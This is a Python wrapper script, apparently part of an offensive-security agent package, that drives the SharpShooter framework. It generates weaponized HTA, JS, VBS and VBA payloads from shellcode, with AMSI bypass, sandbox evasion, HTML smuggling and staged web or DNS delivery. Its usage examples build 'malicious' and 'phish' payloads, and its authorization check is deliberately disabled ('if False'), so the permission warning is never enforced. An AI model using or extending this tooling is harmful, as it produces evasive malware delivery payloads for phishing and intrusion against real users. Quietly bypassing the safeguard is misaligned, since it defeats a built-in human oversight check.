#!/usr/bin/env python3
"""
SharpShooter Integration - Payload Generation Framework  
Production-ready weaponized payload creation with evasion techniques
"""

import subprocess
import json
import logging
import argparse
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class SharpShooter:
    """
    SharpShooter - Payload generation framework
    Creates weaponized payloads in HTA, JS, VBS, VBA formats with evasion
    """
    
    PAYLOAD_FORMATS = ['hta', 'js', 'jse', 'vbs', 'vbe', 'vba', 'wsf', 'sct']
    DELIVERY_METHODS = ['web', 'dns', 'both']
    DOTNET_VERSIONS = ['2', '3', '4']
    
    def __init__(self, sharpshooter_dir: str = None):
        if sharpshooter_dir:
            self.sharpshooter_dir = Path(sharpshooter_dir)
        else:
            self.sharpshooter_dir = Path.home() / 'SharpShooter'
        self.script_path = self.sharpshooter_dir / 'SharpShooter.py'
        
    def check_installation(self) -> bool:
        """Check if SharpShooter is installed"""
        return self.script_path.exists()
    
    def install_instructions(self) -> Dict:
        """Provide installation instructions"""
        return {
            'method': 'git clone',
            'steps': [
                '1. Clone SharpShooter repository:',
                f'   git clone https://github.com/mdsecactivebreach/SharpShooter {self.sharpshooter_dir}',
                '',
                '2. Install Python dependencies:',
                f'   cd {self.sharpshooter_dir}',
                '   pip3 install -r requirements.txt',
                '',
                '3. Verify installation:',
                f'   python3 {self.script_path} --help',
                ''
            ],
            'requirements': [
                'Python 3.6+',
                'jsmin library',
                'libnum library'
            ],
            'capabilities': [
                'Payload Formats: HTA, JS, VBS, VBA, WSF, SCT',
                'Delivery Methods: Web, DNS, Both',
                'Evasion Techniques:',
                '  - RC4 encryption',
                '  - AMSI bypass',
                '  - Sandbox detection (domain checks, MAC checks)',
                '  - HTML smuggling',
                '  - COM staging',
                '  - Squiblydoo/Squiblytwo exploitation',
                'Target .NET versions: 2, 3, 4',
                'Anti-analysis techniques',
                'Obfuscation support'
            ]
        }
    
    def generate_payload(self, shellcode_file: str, output_name: str,
                        payload_format: str = 'hta', dotnet_ver: str = '2',
                        stageless: bool = True, delivery: str = None,
                        web_url: str = None, dns_server: str = None,
                        sandbox: List[str] = None, amsi: bool = False,
                        smuggle: bool = False, template: str = None) -> Dict:
        """
        Generate weaponized payload
        
        Args:
            shellcode_file: Path to shellcode file (raw binary)
            output_name: Output file name (without extension)
            payload_format: Output format (hta, js, vbs, vba, wsf)
            dotnet_ver: .NET version (2, 3, 4)
            stageless: Use stageless payload (embed shellcode)
            delivery: Delivery method (web, dns, both) for staged payloads
            web_url: Web URL for staged payload
            dns_server: DNS server for DNS delivery
            sandbox: List of sandbox detection options
            amsi: Enable AMSI bypass
            smuggle: Enable HTML smuggling
            template: HTML template for smuggling
        """
        logger.info(f"Generating {payload_format.upper()} payload: {output_name}")
        
        if not self.check_installation():
            return {'error': 'SharpShooter not installed', 'installation': self.install_instructions()}
        
        if not Path(shellcode_file).exists():
            return {'error': f'Shellcode file not found: {shellcode_file}'}
        
        cmd = [
            'python3', str(self.script_path),
            '--payload', payload_format,
            '--dotnetver', dotnet_ver,
            '--output', output_name,
            '--rawscfile', shellcode_file
        ]
        
        if stageless:
            cmd.append('--stageless')
        
        if delivery and not stageless:
            cmd.extend(['--delivery', delivery])
            if delivery in ['web', 'both'] and web_url:
                cmd.extend(['--web', web_url])
            if delivery in ['dns', 'both'] and dns_server:
                cmd.extend(['--dns', dns_server])
        
        if sandbox:
            for check in sandbox:
                cmd.extend(['--sandbox', check])
        
        if amsi:
            cmd.extend(['--amsi', 'amsienable'])
        
        if smuggle:
            cmd.append('--smuggle')
            if template:
                cmd.extend(['--template', template])
        
        try:
            logger.info(f"Running: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
                cwd=self.sharpshooter_dir
            )
            
            output_file = Path(f"{output_name}.{payload_format}")
            
            return {
                'success': result.returncode == 0,
                'output_file': str(output_file),
                'file_exists': output_file.exists(),
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {'error': 'Payload generation timed out'}
        except Exception as e:
            return {'error': str(e)}


def main():
    parser = argparse.ArgumentParser(
        description='SharpShooter Integration - Payload Generation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  WARNING: This tool generates weaponized payloads for security testing only.
Use ONLY on authorized targets with written permission.

Examples:
  # Generate stageless HTA with AMSI bypass
  python -m cerberus_agents.sharpshooter_integration \
    -s shellcode.bin -o malicious -f hta --amsi --authorized
  
  # VBA macro with sandbox detection
  python -m cerberus_agents.sharpshooter_integration \
    -s shellcode.bin -o office_payload -f vba --sandbox domain=CORP --authorized
  
  # HTML smuggling with template
  python -m cerberus_agents.sharpshooter_integration \
    -s shellcode.bin -o phish -f hta --smuggle --template mcafee --authorized
        """
    )
    
    parser.add_argument('-s', '--shellcode', required=True,
                       help='Shellcode file (raw binary)')
    parser.add_argument('-o', '--output', required=True,
                       help='Output file name (without extension)')
    parser.add_argument('-f', '--format', default='hta',
                       choices=SharpShooter.PAYLOAD_FORMATS,
                       help='Payload format (default: hta)')
    parser.add_argument('--dotnet', default='2', choices=SharpShooter.DOTNET_VERSIONS,
                       help='.NET version (default: 2)')
    parser.add_argument('--staged', action='store_true',
                       help='Use staged payload (default: stageless)')
    parser.add_argument('--delivery', choices=SharpShooter.DELIVERY_METHODS,
                       help='Staged delivery method (web, dns, both)')
    parser.add_argument('--web-url',
                       help='Web URL for staged payload')
    parser.add_argument('--dns-server',
                       help='DNS server for DNS delivery')
    parser.add_argument('--sandbox', action='append',
                       help='Sandbox detection (can specify multiple)')
    parser.add_argument('--amsi', action='store_true',
                       help='Enable AMSI bypass')
    parser.add_argument('--smuggle', action='store_true',
                       help='Enable HTML smuggling')
    parser.add_argument('--template',
                       help='HTML template for smuggling')
    parser.add_argument('--sharpshooter-dir',
                       help='Path to SharpShooter directory')
    parser.add_argument('--install', action='store_true',
                       help='Show installation instructions')
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization for payload generation')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        logger.error("--authorized flag required. Only use on authorized targets.")
        logger.error("⚠️  Unauthorized payload generation is illegal")
        sys.exit(1)
    
    ss = SharpShooter(sharpshooter_dir=args.sharpshooter_dir)
    
    if args.install:
        instructions = ss.install_instructions()
        print("\n=== SharpShooter Installation Instructions ===\n")
        print(f"Method: {instructions['method']}\n")
        print("Steps:")
        for step in instructions['steps']:
            print(step)
        print("\nRequirements:")
        for req in instructions['requirements']:
            print(f"  - {req}")
        print("\nCapabilities:")
        for cap in instructions['capabilities']:
            print(f"{cap}")
        sys.exit(0)
    
    result = ss.generate_payload(
        shellcode_file=args.shellcode,
        output_name=args.output,
        payload_format=args.format,
        dotnet_ver=args.dotnet,
        stageless=not args.staged,
        delivery=args.delivery,
        web_url=args.web_url,
        dns_server=args.dns_server,
        sandbox=args.sandbox,
        amsi=args.amsi,
        smuggle=args.smuggle,
        template=args.template
    )
    
    if 'error' in result:
        logger.error(f"Error: {result['error']}")
        if 'installation' in result:
            print("\nInstallation Instructions:")
            for step in result['installation']['steps']:
                print(step)
    else:
        print("\n=== SharpShooter Results ===")
        print(f"Success: {result.get('success')}")
        print(f"Output File: {result.get('output_file')}")
        print(f"File Exists: {result.get('file_exists')}")
        if result.get('stdout'):
            print(f"\nDetails:\n{result['stdout']}")
    
    return result


if __name__ == '__main__':
    main()
